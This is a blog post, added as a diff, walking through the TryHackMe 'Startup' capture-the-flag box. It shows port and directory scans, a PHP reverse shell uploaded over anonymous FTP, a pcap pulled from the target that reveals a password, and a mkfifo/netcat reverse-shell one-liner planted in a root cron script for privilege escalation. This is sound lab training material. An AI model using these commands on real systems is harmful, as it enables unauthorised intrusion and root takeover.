@@ -1,0 +1,247 @@
+---
+layout: post
+title:  "Tryhackme: Startup"
+date:   2021-02-13 21:15:56 +0200
+categories: tryhackme
+---
+## Nmap Scan ##
+### Inital Port Scan ###
+```
+sudo nmap -sS -p- -Pn -T5 -vv 10.10.133.97
+```
+```
+Nmap scan report for 10.10.133.97
+Host is up, received user-set (0.060s latency).
+Scanned at 2021-02-13 14:20:36 EST for 154s
+Not shown: 65530 closed ports
+Reason: 65530 resets
+PORT      STATE    SERVICE REASON
+21/tcp    open     ftp     syn-ack ttl 63
+22/tcp    open     ssh     syn-ack ttl 63
+80/tcp    open     http    syn-ack ttl 63
+27745/tcp filtered unknown no-response
+40152/tcp filtered unknown no-response
+```
+Looks like we got filtered ports. Possible AV? Let's ignore for now and just scan the first three ports.
+
+## Targeted Port Scan ##
+```
+sudo nmap -sSCV -p 21,22,80 -Pn -T5 -vv 10.10.133.97
+```
+```
+Nmap scan report for 10.10.133.97
+Host is up, received user-set (0.064s latency).
+Scanned at 2021-02-13 14:26:20 EST for 10s
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.8.135.88
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAzds8QxN5Q2TsERsJ98huSiuasmToUDi9JYWVegfTMV4Fn7t6/2ENm/9uYblUv+pLBnYeGo3XQGV23foZIIVMlLaC6ulYwuDOxy6KtHauVMlPRvYQd77xSCUqcM1ov9d00Y2y5eb7S6E7zIQCGFhm/jj5ui6bcr6wAIYtfpJ8UXnlHg5f/mJgwwAteQoUtxVgQWPsmfcmWvhreJ0/BF0kZJqi6uJUfOZHoUm4woJ15UYioryT6ZIw/ORL6l/LXy2RlhySNWi6P9y8UXrgKdViIlNCun7Cz80Cfc16za/8cdlthD1czxm4m5hSVwYYQK3C7mDZ0/jung0/AJzl48X1
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOKJ0cuq3nTYxoHlMcS3xvNisI5sKawbZHhAamhgDZTM989wIUonhYU19Jty5+fUoJKbaPIEBeMmA32XhHy+Y+E=
+|   256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPnFr/4W5WTyh9XBSykso6eSO6tE0Aio3gWM8Zdsckwo
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Maintenance
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Looks like we got an ```FTP``` service that allows ```anonymous``` logins, ```SSH``` and a version of ```Apache```. What is VERY interesting is the writing permission for ```FTP```. Clearly, an occasion to set foothold by uploading a reverse shell.
+
+## Directory Bruteforcing ##
+```
+gobuster dir -u http://10.10.133.97/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 16
+```
+```
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.133.97/
+[+] Threads:        16
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/02/13 14:20:58 Starting gobuster
+===============================================================
+/files (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2021/02/13 14:37:45 Finished
+===============================================================
+```
+
+Interesting ```/files``` directory gobuster got us there!
+
+![files directory](/assets/images/Startup/files.png)
+
+The ```important.jpg``` image is just a meme:
+![meme image](/assets/images/Startup/Startup_meme.png)
+
+The ```notice.txt``` might be interesting, as it seems to give us a username:
+```
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
+```
+
+## Setting Foothold ##
+Alright, now let's login to the ```FTP``` server anonymously and upload a reverse php shell and access it through the previously found directory.
+```
+ftp 10.10.133.97
+Connected to 10.10.133.97.
+220 (vsFTPd 3.0.3)
+Name (10.10.133.97:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12 04:53 ftp
+-rw-r--r--    1 0        0          251631 Nov 12 04:02 important.jpg
+-rw-r--r--    1 0        0             208 Nov 12 04:53 notice.txt
+226 Directory send OK.
+ftp> cd ftp
+250 Directory successfully changed.
+ftp> put shell.php
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5493 bytes sent in 0.01 secs (360.3801 kB/s)
+```
+Let's start the ```netcat``` listener
+```
+nc -nlvp 1234
+```
+Now just access the shell through the ```/files/ftp/shell.php``` path.
+
+### Shell Stabilisation ###
+```
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@startup:/$ export TERM=xterm-256color
+export TERM=xterm-256color
+```
+Now background this session using ```CTRL + Z```.
+```
+stty raw -echo;fg
+```
+Press ```ENTER``` twice and there we go! Now we got ourselves a better shell. Let's get the recipe now.
+```
+www-data@startup:/$ ls
+bin   home            lib         mnt         root  srv  vagrant
+boot  incidents       lib64       opt         run   sys  var
+dev   initrd.img      lost+found  proc        sbin  tmp  vmlinuz
+etc   initrd.img.old  media       recipe.txt  snap  usr  vmlinuz.old
+www-data@startup:/$ cat recipe.txt 
+Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
+```
+
+## Getting User Flag ##
+Interestingly enough, in the previous directory output we notice the ```incidents``` directory. Inspecting it further we stumble upon a ```Wireshark``` capture:
+```
+www-data@startup:/$ cd incidents/
+www-data@startup:/incidents$ ls
+suspicious.pcapng
+```
+
+Let's download this file to out host machine and investigate it.
+First, start a python http server on the victim in that directory:
+```
+www-data@startup:/incidents$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 ...
+```
+Then, download it to our machine through HTTP:
+```
+wget http://10.10.133.97:8000/suspicious.pcapng                                                            4 ⨯
+--2021-02-13 15:04:09--  http://10.10.133.97:8000/suspicious.pcapng
+Connecting to 10.10.133.97:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 31224 (30K) [application/octet-stream]
+Saving to: ‘suspicious.pcapng’
+
+suspicious.pcapng            100%[=============================================>]  30.49K  --.-KB/s    in 0.1s    
+
+2021-02-13 15:04:09 (211 KB/s) - ‘suspicious.pcapng’ saved [31224/31224]
+```
+![pcap](/assets/images/Startup/startup_wireshark.png)
+
+While following one of the TCP streams, we notice that the password for the user is sent through plaintext. So let's login as the user and get our flag.
+```
+www-data@startup:/incidents$ su lennie
+lennie@startup:/incidents$ cat ~/user.txt 
+```
+
+## Privilege Escalation ##
+We notice we are not allowed to run ```sudo``` as ```lennie```, but there are some interesting files inside the user's ```scripts``` directory:
+```
+lennie@startup:/incidents$ sudo -l
+sudo: unable to resolve host startup
+[sudo] password for lennie: 
+Sorry, user lennie may not run sudo on startup.
+lennie@startup:/incidents$ cd ~
+lennie@startup:~$ ls
+Documents  scripts  user.txt
+lennie@startup:~$ cd scripts/
+lennie@startup:~/scripts$ ls
+planner.sh  startup_list.txt
+lennie@startup:~/scripts$ cat planner.sh 
+#!/bin/bash
+echo $LIST > /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+lennie@startup:~/scripts$ cat startup_list.txt 
+
+```
+The ```startup_list.txt``` file is empty, unfortunately. However, the ```planner.sh``` script is set to run as root and it seems to invocate another small script:
+```
+lennie@startup:~/scripts$ ls -la
+total 16
+drwxr-xr-x 2 root   root   4096 Nov 12 04:54 .
+drwx------ 4 lennie lennie 4096 Nov 12 04:53 ..
+-rwxr-xr-x 1 root   root     77 Nov 12 04:53 planner.sh
+-rw-r--r-- 1 root   root      1 Feb 13 20:16 startup_list.txt
+lennie@startup:~/scripts$ cat /etc/print.sh
+#!/bin/bash
+echo "Done!"
+```
+It seems that ```/etc/print.sh``` is owned by ```lennie```. I was hoping to find somewhere whether the ```planner.sh``` is a cronjob run as ```root```, but I just couldn't find it anywhere. So I put my faith in my CTF experience and hoped it is indeed a cronjob, as it seems to be very similar to other CTF situations. So, let's try our luck and write to ```/etc/print.sh``` a reverse shell and see if we get the
+```root``` shell.
+First start our ```netcat``` listener:
+```
+nc -nlvp 1234
+```
+And add the following one-liner in ```/etc/print.sh```:
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.135.88 1234 >/tmp/f
+```
+
+And, luckily, it is indeed a cronjob and we receive a ```root``` shell! Let's get our flag and finish.
+```
+# whoami
+root
+# cat /root/root.txt
+```
